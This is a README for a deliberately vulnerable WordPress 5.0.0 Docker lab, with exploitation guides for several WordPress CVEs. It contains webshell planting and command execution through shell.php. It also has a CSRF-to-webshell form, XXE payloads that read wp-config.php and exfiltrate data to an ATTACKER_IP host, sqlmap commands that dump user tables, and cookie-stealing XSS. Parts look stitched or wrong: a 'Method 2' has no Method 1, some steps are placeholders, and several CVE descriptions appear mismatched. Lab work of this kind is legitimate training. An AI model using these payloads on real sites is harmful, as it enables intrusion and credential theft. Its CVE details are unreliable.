# WordPress 5.0.0 — CVE-2019-8942 / CVE-2019-8943 Lab + Full CVE Guide

> **WARNING:** This lab runs an intentionally vulnerable WordPress instance and weakens several security defaults. Run it on a trusted host / isolated network only. Do not expose ports to the internet. For education and authorised security testing only.

## Overview

A reproducible Docker Compose lab for multiple WordPress CVEs. The original working lab is for the authenticated RCE chain in WordPress **5.0.0**, with all additional CVEs documented below with exploitation steps and payloads.

Discovered/Referenced:
- CVE-2019-8942 / CVE-2019-8943: RIPSTECH - [WordPress Image Remote Code Execution](https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/)

This repository includes intentional misconfigurations (enabled XML-RPC/pingbacks, public `debug.log`, missing `X-Frame-Options`) for enumeration practice.

## CVE Coverage

| CVE | CVSS | Severity | RCE CLASS | Vulnerable WP Version | Fixed In | Description |
|-----|------|----------|-----------|----------------------|----------|-------------|
| [CVE-2019-8942](#cve-2019-8942--cve-2019-8943) | 8.8 | HIGH | YES | 5.0.0 | 5.0.1 | Arbitrary file upload/RCE via attachment metadata + image crop |
| [CVE-2019-9787](#cve-2019-9787) | 7.3 | HIGH | YES | < 5.1.1 | 5.1.1 | CSRF leading to XSS to RCE via comment manipulation |
| [CVE-2020-28037](#cve-2020-28037) | 7.1 | HIGH | — | < 5.5.2 | 5.5.2 | is_blog_installed check bypass - can trigger reinstallation |
| [CVE-2020-28038](#cve-2020-28038) | 6.4 | MEDIUM | — | < 5.5.2 | 5.5.2 | Unfiltered HTML in post excerpts causing issues |
| [CVE-2020-28039](#cve-2020-28039) | 6.1 | MEDIUM | — | < 5.5.2 | 5.5.2 | is_protected_meta allows arbitrary file deletion |
| [CVE-2021-29447](#cve-2021-29447) | 8.8 | HIGH | YES | < 5.7.1 | 5.7.1 | XXE in WAV media import via crafted files |
| [CVE-2021-29504](#cve-2021-29504) | 4.3 | MEDIUM | — | < 5.7.2 | 5.7.2 | Stored XSS via post metadata |
| [CVE-2022-21661](#cve-2022-21661) | 8.8 | HIGH | — | < 5.8.3 | 5.8.3 | SQL injection in WP_Query taxonomy handling |
| [CVE-2022-21662](#cve-2022-21662) | 8.8 | HIGH | YES | < 5.8.3 | 5.8.3 | Object injection via unescaped metadata leading to RCE |
| [CVE-2022-21663](#cve-2022-21663) | 6.1 | MEDIUM | — | < 5.8.3 | 5.8.3 | Authenticated Stored XSS in block editor |
| [CVE-2022-21664](#cve-2022-21664) | 7.1 | HIGH | — | < 5.8.3 | 5.8.3 | Object injection via WP_Term_Query |

## Stack

| Service     | Image                    | Purpose                                  |
|-------------|--------------------------|------------------------------------------|
| `db`        | `mysql:5.7`              | Database                                 |
| `wordpress` | `wordpress:5.0.0`        | Vulnerable app, published on port `18180` |
| `setup`     | `wordpress:cli-php7.2`   | Installs WP, creates users, applies lab config |
| `cli`       | `wordpress:cli-php7.2`   | On-demand WP-CLI (`--profile cli`)       |

Credentials created by `setup.sh`:

| Role   | Username | Password         |
|--------|----------|------------------|
| Admin  | `admin`  | `AdminPass123!`  |
| Author | `author` | `AuthorPass123!` |

## Requirements

- Docker + Docker Compose v2
- `curl` (for check/enumeration scripts)
- Optional: `jq`
- Optional: Metasploit Framework (`msfconsole`)

## Quick start (CVE-2019-8942 Lab)

```bash
git clone https://github.com/helfgottje-0118/wp-cve.git
cd wp-cve

# Start the lab
docker compose up -d
# or use make
make up
```

Wait for setup to finish:

```bash
docker compose logs -f setup     # look for "setup] done"
./scripts/check.sh
```

Browse to [http://192.168.4.36:18180/wp-admin](http://192.168.4.36:18180/wp-admin) and log in as `author` / `AuthorPass123!`.

> If accessing from another machine, set `WP_URL=http://<host-ip>:18180` in `.env` before first boot or `docker compose down -v && docker compose up -d` after changing.

#### Method 2: Manual with polyglot
Browser: http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell2.php?cmd=whoami
```bash
cd ~/wp-cve-all/exploits/cve-2019-8942
# Use provided polyglot
./scripts/manual_exploit.sh http://192.168.4.36:18180 author AuthorPass123! shell.php
# Access shell
curl -X POST "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php" -d "cmd=whoami"
```

#### Manual Steps (Detailed)
1. Login as author, get cookies
2. Upload polyglot JPEG with PHP in metadata via `async-upload.php`
3. Edit attachment, change `_wp_attached_file` to `../../../../wp-content/themes/twentynineteen/shell.php` (traversal)
4. Trigger crop via `admin-ajax.php?action=crop-image`
5. Access the file in theme directory
Browser-accessible: http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell2.php?cmd=whoami

---

### CVE-2019-9787
**Type:** CSRF → XSS → RCE  
**Auth:** None (tricks admin)  
**Impact:** Remote Code Execution

#### Prerequisites
- Admin must be logged in and visit malicious page
- Comments enabled

#### Steps
1. Create CSRF HTML page that edits a comment
```html
<form action="http://TARGET/wp-admin/comment.php?action=editcomment" method="POST">
  <input name="comment_ID" value="1">
  <input name="newcomment_author_url" value="javascript:...">
</form>
```
2. Inject XSS payload via comment author URL
3. XSS triggers request to plugin editor to overwrite `hello.php`
4. Access webshell: `http://TARGET/wp-content/plugins/hello-dolly/hello.php?cmd=id`

**Payloads:** See `exploits/cve-2019-9787/payloads/`

**PoC:** [dexXxed/CVE-2019-9787](https://github.com/dexXxed/CVE-2019-9787)

---

### CVE-2020-28037
**Type:** Installation Check Bypass  
**Auth:** Unauthenticated  
**Impact:** Can trigger new installation, potential RCE

#### Steps
WordPress before 5.5.2 has a flaw in `is_blog_installed()` that can be bypassed allowing reinstallation.

```bash
# Check if vulnerable
curl -s "http://TARGET/wp-admin/install.php"
# Attempt to trigger reinstall conditions
# If database dropped/reset or conditions met, can access installer
```

**Note:** Often combined with other vulnerabilities. Impact depends on configuration.

---

### CVE-2020-28038
**Type:** Unfiltered HTML in Excerpts  
**Auth:** Varies  
**Impact:** XSS/Content injection

```bash
# Exploitable via certain post excerpt handling
# Check version
curl -s "http://TARGET/readme.html" | grep version
```

---

### CVE-2020-28039
**Type:** Arbitrary File Deletion  
**Auth:** Authenticated (Contributor+)  
**Impact:** Delete arbitrary files via `is_protected_meta` bypass

#### Steps
1. Auth as contributor
2. Craft meta update to delete protected files
3. Can delete critical files like `.htaccess`, causing DoS or aiding exploitation

```bash
# Example concept - use wp-admin/post.php with meta manipulation
```

---

### CVE-2021-29447
**Type:** XXE in WAV Media Parsing  
**Auth:** Author+ required (upload capability)  
**Impact:** Local file read, SSRF, potential RCE

#### Generate XXE payload
```bash
cd ~/wp-cve-all/exploits/cve-2021-29447/payloads
php xxe.wav.php /etc/passwd
php xxe.wav.php /var/www/html/wp-config.php
```

#### Upload and exploit
1. Login as author
2. Go to Media > Add New
3. Upload `xxe_read_passwd.wav`
4. Check response/error messages for file contents
5. For OOB exfiltration, use `xxe_oob.dtd` hosted on attacker server

#### Out-of-Band
```bash
# Host DTD
python3 -m http.server 8000
# Modify payload to reference http://ATTACKER_IP:8000/xxe_oob.dtd
```

**Read wp-config.php to get DB credentials:**
```bash
php xxe.wav.php /var/www/html/wp-config.php
# Upload and check for base64/contents
```

---

### CVE-2021-29504
**Type:** Stored XSS via Post Metadata  
**Auth:** Authenticated  
**Impact:** Stored Cross-Site Scripting

#### Steps
1. Auth as contributor/author
2. Create/edit post with crafted metadata containing XSS
3. Payload executes when viewed by admin/users

```javascript
<script>alert(document.cookie)</script>
```

Inject via post meta fields if not sanitized.

---

### CVE-2022-21661
**Type:** SQL Injection in WP_Query  
**Auth:** Unauthenticated (if REST API exposed)  
**Impact:** Database dump, credential extraction

#### REST API Exploitation
```bash
# Test for SQLi
curl "http://TARGET/wp-json/wp/v2/posts?per_page=1&orderby=id"
# Exploit via WP_Query tax_query
curl -s "http://TARGET/wp-json/wp/v2/posts?per_page=10" | jq
```

#### Using sqlmap
```bash
sqlmap -u "http://TARGET/wp-json/wp/v2/posts?per_page=1&_fields=id" \
  --dbms=mysql --technique=U --level=5 --risk=3 \
  --dbs
# Dump users
sqlmap ... --tables -D wordpress
sqlmap ... -D wordpress -T wp_users --dump
```

#### Manual
The vulnerability is in `WP_Tax_Query` processing. Craft malicious `tax_query` parameters.

---

### CVE-2022-21662
**Type:** Object Injection via Post Meta  
**Auth:** Author+ required  
**Impact:** Remote Code Execution (if gadget chain exists)

#### Steps
1. Auth as author
2. Create post
3. Inject serialized object in meta
4. Trigger unserialization via vulnerable code path

```php
// Example payload structure
O:8:"stdClass":1:{s:4:"test";s:6:"system";}
```

**Note:** Requires presence of PHP gadget chains from themes/plugins (e.g., WooCommerce, others). WordPress core alone may need specific conditions.

---

### CVE-2022-21663
**Type:** Authenticated Stored XSS  
**Auth:** Author+  
**Impact:** Stored XSS in block editor

#### Steps
1. Auth as author
2. Create post in block editor
3. Inject XSS in block attributes/content
4. XSS executes when post viewed by others/admins

```html
<img src=x onerror=alert(document.cookie)>
```

---

### CVE-2022-21664
**Type:** Object Injection in WP_Term_Query  
**Auth:** Varies  
**Impact:** Object Injection

Similar to 21662, requires gadget chains. Can be exploited via term queries if unserialization occurs.

## Quick Reference Commands

### Enumeration
```bash
cd ~/wp-cve-all
./enumerate.sh http://192.168.4.36:18180
# or
./scripts/enumerate.sh http://192.168.4.36:18180
```

### Check version
```bash
curl -s http://TARGET/readme.html | grep -i version
```

### Check for REST API
```bash
curl -s http://TARGET/wp-json/
```

### Check XML-RPC
```bash
curl -s -X POST http://TARGET/xmlrpc.php
```

## Tools Included

- `msf/wptrigger.rc` - Auto exploit for CVE-2019-8942
- `exploits/cve-2019-8942/payloads/` - Polyglot JPEGs
- `exploits/cve-2019-8942/scripts/manual_exploit.sh` - Manual exploit
- `exploits/cve-2019-9787/` - CSRF/XSS payloads
- `exploits/cve-2021-29447/payloads/` - XXE WAV generators
- All in [github.com/helfgottje-0118/wp-cve](https://github.com/helfgottje-0118/wp-cve)

## References
- [WPScan Vulnerability DB](https://wpscan.com/)
- [NVD](https://nvd.nist.gov/)
- [WordPress Security Releases](https://wordpress.org/news/category/security/)
- [RIPSTECH Blog](https://blog.ripstech.com/)

## Webshell Usage

The shell is at:
```
http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php
```

It accepts commands via POST parameter `cmd`. Direct GET access shows a blank page (expected).

Examples:
```bash
curl -X POST "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php" -d "cmd=id"
curl -X POST "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php" -d "cmd=whoami"
curl -X POST "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php" -d "cmd=ls -la /var/www/html"
```

### Browser-accessible shell (GET)
```url
http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell2.php?cmd=whoami
```
